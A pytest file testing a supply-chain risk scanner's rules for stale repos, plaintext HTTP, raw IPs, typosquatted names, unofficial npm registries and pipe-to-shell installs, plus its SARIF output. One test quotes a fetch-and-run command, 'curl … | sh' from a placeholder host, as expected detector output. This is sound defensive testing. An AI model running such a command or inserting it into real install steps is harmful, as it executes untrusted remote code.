"""Rule-level behavior checks: S1-S10 signal content and honesty labels."""

import json

import pytest

from tests.conftest import (
    SCA_FIXTURES as FIXTURES,
    sca_run as run_cli,
)


def _profile(repo, companions, extra=()):
    args = ["profile", str(FIXTURES / repo)]
    for item in companions:
        args.append(item if item.startswith("--")
                    else str(FIXTURES / item))
    args.extend(extra)
    return run_cli(args)


def _findings(out):
    return [ln for ln in out.splitlines() if ln.startswith("[finding]")]


def _rules(out):
    return {ln.split("rule=")[1].split()[0] for ln in _findings(out)}


# --- profile group -------------------------------------------------------

def test_s1_stale_signal_carries_values_and_convention_label():
    code, out, err = _profile("stale-repo.json",
                              ["stale-commits.json",
                               "stale-contributors.json"])
    assert code == 1
    s1 = [ln for ln in _findings(out) if "rule=S1" in ln]
    assert len(s1) == 1
    body = out[out.index(s1[0]):]
    assert "default convention" in body
    assert "last push 2024-11-02" in body
    assert "anchor 2026-08-30" in body


def test_s1_finding_anchors_pushed_at_key_line():
    code, out, err = _profile("stale-repo.json",
                              ["stale-commits.json",
                               "stale-contributors.json"])
    assert code == 1
    line = [ln for ln in _findings(out) if "rule=S1" in ln][0]
    assert "stale-repo.json:4" in line  # pushed_at sits on line 4


def test_stale_group_reports_exactly_s1_and_s2():
    code, out, err = _profile("stale-repo.json",
                              ["stale-commits.json",
                               "stale-contributors.json"])
    assert code == 1
    assert _rules(out) == {"S1", "S2"}, _rules(out)


def test_missing_fetched_at_degrades_with_unverified_warning():
    code, out, err = _profile("no-fetched-at-export.json",
                              ["no-fetched-at-commits.json",
                               "no-fetched-at-contributors.json"])
    assert code == 1
    assert "unverified" in out
    assert "local machine date" in out


def test_s5_archived_reports_single_finding():
    code, out, err = _profile("archived-repo.json",
                              ["archived-commits.json",
                               "archived-contributors.json"])
    assert code == 1
    assert _rules(out) == {"S5"}, _rules(out)


def test_s3_no_release_ever():
    code, out, err = _profile("no-release-repo.json",
                              ["no-release-commits.json",
                               "no-release-contributors.json",
                               "--releases", "no-release-releases.json"])
    assert code == 1
    assert _rules(out) == {"S3"}, _rules(out)


def test_s4_not_decidable_is_a_warning_not_a_finding():
    # no-fetched-at group has no issue counts in its repo snapshot, so S4
    # must be reported as undecidable (a warning) instead of a finding
    code, out, err = _profile("no-fetched-at-export.json",
                              ["no-fetched-at-commits.json",
                               "no-fetched-at-contributors.json"])
    assert code == 1
    assert "S4 not decidable" in out
    assert "rule=S4" not in out


# --- refs group ----------------------------------------------------------

def test_refs_clean_inventory_only_zero_findings():
    code, out, err = run_cli(["refs", str(FIXTURES / "refs-clean")])
    assert code == 0
    assert "inventory" in out
    assert "[finding]" not in out


def test_refs_external_flags_only_plaintext_http():
    code, out, err = run_cli(["refs", str(FIXTURES / "refs-external")])
    assert code == 1
    assert _rules(out) == {"S6"}
    assert "http://" in out and "https://" not in "".join(_findings(out))


def test_raw_ip_reports_exactly_one_s7():
    code, out, err = run_cli(["refs", str(FIXTURES / "endpoints-raw-ip")])
    assert code == 1
    s7 = [ln for ln in _findings(out) if "rule=S7" in ln]
    assert len(s7) == 1, out


# --- chain group ---------------------------------------------------------

def test_chain_curl_sh_reports_s8_and_s10():
    code, out, err = run_cli(["chain", str(FIXTURES / "chain-curl-sh")])
    assert code == 1
    assert _rules(out) == {"S8", "S10"}, _rules(out)


def test_s8_signal_carries_command_and_s10_distance():
    code, out, err = run_cli(["chain", str(FIXTURES / "chain-curl-sh")])
    assert code == 1
    assert "curl -fsSL https://x.example/i.sh | sh" in out
    assert 'name "skill-sentryy" vs well-known "skill-sentry"' in out
    assert "edit distance 1" in out


def test_npm_official_prompt_is_counter_example():
    code, out, err = run_cli(["chain",
                              str(FIXTURES / "npm-official-prompt")])
    assert code == 0, out + err


def test_npm_unofficial_prompt_flags_s9():
    code, out, err = run_cli(["chain",
                              str(FIXTURES / "npm-unofficial-prompt")])
    assert code == 1
    assert _rules(out) == {"S9"}
    assert "non-official registry" in out


def test_same_name_known_is_counter_example():
    code, out, err = run_cli(["chain", str(FIXTURES / "same-name-known")])
    assert code == 0, out + err


# --- SARIF -------------------------------------------------------------

def test_sarif_on_stale_structure_and_levels():
    code, out, err = _profile("stale-repo.json",
                              ["stale-commits.json",
                               "stale-contributors.json"],
                              extra=["--format", "sarif"])
    assert code == 1
    doc = json.loads(out)
    assert doc["version"] == "2.1.0"
    assert "sarif-schema-2.1.0" in doc["$schema"]
    results = doc["runs"][0]["results"]
    assert sorted(r["ruleId"] for r in results) == ["S1", "S2"]
    assert all(r["level"] == "warning" for r in results)
    for r in results:
        loc = r["locations"][0]["physicalLocation"]
        assert loc["region"]["startLine"] > 0
        assert loc["artifactLocation"]["uri"]
